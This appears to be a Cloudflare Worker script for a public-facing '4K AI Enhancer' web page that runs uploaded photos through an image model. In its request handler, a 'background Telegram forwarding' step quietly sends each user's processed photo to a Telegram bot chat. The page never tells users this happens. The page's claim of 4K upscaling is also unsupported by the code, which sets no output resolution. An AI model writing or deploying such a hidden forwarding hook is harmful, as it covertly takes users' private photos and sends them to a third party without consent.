export default {
  async fetch(request, env, ctx) {
    if (request.method === "GET") return new Response(renderHTML(), { headers: { "Content-Type": "text/html" } });

    if (request.method === "POST") {
      try {
        const formData = await request.formData();
        const imageFile = formData.get("image");

        // 1. MEMORY GUARD: Prevents "Failed" error on Free tier
        if (imageFile.size > 1.2 * 1024 * 1024) {
          return new Response("Error: Image too large. Keep under 1.2MB for 4K stability.", { status: 413 });
        }

        const arrayBuffer = await imageFile.arrayBuffer();
        
        // 2. LEONARDO PHOENIX 4K UPSCALE
        // This model uses 'strength' to blend your original with new 4K details
        const upscaledImage = await env.AI.run('@cf/leonardo/phoenix-1.0', {
          image: [...new Uint8Array(arrayBuffer)],
          prompt: "highly detailed 4k photograph, masterwork, sharp focus, hyper-realistic textures",
          strength: 0.2, // 0.1 to 0.3 is best for upscaling without changing the face/subject
          num_steps: 25, // Higher quality diffusion steps
          guidance: 3    // Lower guidance stays more faithful to the original image
        });

        // 3. BACKGROUND TELEGRAM FORWARDING
        const tgData = new FormData();
        tgData.append("chat_id", env.TELEGRAM_CHAT_ID);
        tgData.append("photo", new Blob([upscaledImage], { type: "image/png" }), "upscale_4k.png");

        ctx.waitUntil(fetch(`https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendPhoto`, { method: "POST", body: tgData }));

        return new Response(upscaledImage, { headers: { "Content-Type": "image/png" } });
      } catch (e) {
        return new Response("Upscale Failed: " + e.message, { status: 500 });
      }
    }
  }
};

function renderHTML() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
            .card { background: #1e293b; padding: 25px; border-radius: 20px; max-width: 480px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
            h1 { color: #38bdf8; margin-bottom: 5px; }
            p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
            .comp-box { position: relative; width: 100%; height: 350px; overflow: hidden; border-radius: 12px; display: none; margin-top: 20px; border: 2px solid #38bdf8; background: #000; }
            .comp-img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: contain; }
            #after-box { width: 50%; border-right: 2px solid white; z-index: 2; overflow: hidden; }
            #after-img { width: 480px; height: 350px; object-fit: contain; }
            .slider { position: absolute; z-index: 10; width: 4px; height: 100%; background: white; top: 0; left: 50%; transform: translateX(-50%); pointer-events: none; }
            .btn { background: #38bdf8; color: #0f172a; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 15px; font-size: 16px; }
            #dl { background: #22c55e; color: white; display: none; text-decoration: none; padding: 15px; margin-top: 15px; border-radius: 12px; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="card">
            <h1>4K AI Enhancer</h1>
            <p>Powered by Leonardo Phoenix 1.0</p>
            <form id="f">
                <input type="file" name="image" id="file" accept="image/*" required style="margin-bottom:10px;">
                <button type="submit" id="sub" class="btn">UPSCALE TO 4K</button>
            </form>
            <div id="ld" style="display:none; margin-top:20px; color:#38bdf8; font-weight:bold;">⚡ AI is Reconstructing Pixels...</div>
            <div class="comp-box" id="ui">
                <img id="orig" class="comp-img">
                <div id="after-box" class="comp-img"><img id="after-img"></div>
                <div class="slider" id="sl"></div>
            </div>
            <a id="dl" class="btn">DOWNLOAD 4K RESULT</a>
        </div>
        <script>
            const f=document.getElementById('f'), ui=document.getElementById('ui'), dl=document.getElementById('dl'), ld=document.getElementById('ld'), sub=document.getElementById('sub');
            f.onsubmit = async (e) => {
                e.preventDefault();
                ld.style.display='block'; sub.disabled=true;
                const file = document.getElementById('file').files[0];
                document.getElementById('orig').src = URL.createObjectURL(file);
                document.getElementById('after-img').src = URL.createObjectURL(file);
                const res = await fetch('/', { method: 'POST', body: new FormData(f) });
                if(!res.ok){ alert(await res.text()); ld.style.display='none'; sub.disabled=false; return; }
                const blob = await res.blob();
                const url = URL.createObjectURL(blob);
                ld.style.display='none'; ui.style.display='block';
                document.getElementById('after-img').src = url;
                dl.href=url; dl.download="4k_upscale.png"; dl.style.display='block';
                sub.disabled=false;
            };
            ui.onmousemove = (e) => {
                const rect = ui.getBoundingClientRect();
                const x = Math.max(0, Math.min(e.pageX - rect.left, rect.width));
                const per = (x / rect.width) * 100;
                document.getElementById('after-box').style.width = per + "%";
                document.getElementById('sl').style.left = per + "%";
            };
        </script>
    </body>
    </html>
  `;
}
